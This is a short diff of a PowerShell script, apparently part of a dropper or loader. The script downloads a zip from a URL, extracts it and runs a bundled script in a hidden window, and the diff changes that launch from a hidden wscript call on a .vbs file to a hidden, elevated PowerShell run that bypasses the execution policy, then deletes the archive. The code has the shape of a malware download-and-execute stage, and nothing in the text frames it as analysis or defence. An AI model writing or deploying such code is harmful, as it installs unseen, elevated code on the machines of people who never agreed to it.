@@ -15,12 +15,13 @@ if (-not (Test-Path `$dest)) {
 Invoke-WebRequest -Uri `$zipUrl -OutFile `$zipPath
 Expand-Archive -Path `$zipPath -DestinationPath `$dest -Force
 
-`$vbs = Get-ChildItem -Path "`$dest\App" -Filter "*.vbs" -Recurse -File | Select-Object -First 1
+`$ps1 = Get-ChildItem -Path "`$dest\App" -Filter "*.ps1" -Recurse -File | Select-Object -First 1
 
-if (`$vbs) {
-    Start-Process -FilePath "wscript.exe" `
-        -ArgumentList "`"`$(`$vbs.FullName)`"`" `
-        -WindowStyle Hidden | Out-Null
+if (`$ps1) {
+    Start-Process powershell.exe `
+        -WindowStyle Hidden `
+        -Verb RunAs `
+        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"`$(`$ps1.FullName)`"`" | Out-Null
 }
 
 Remove-Item `$zipPath -Force -ErrorAction SilentlyContinue
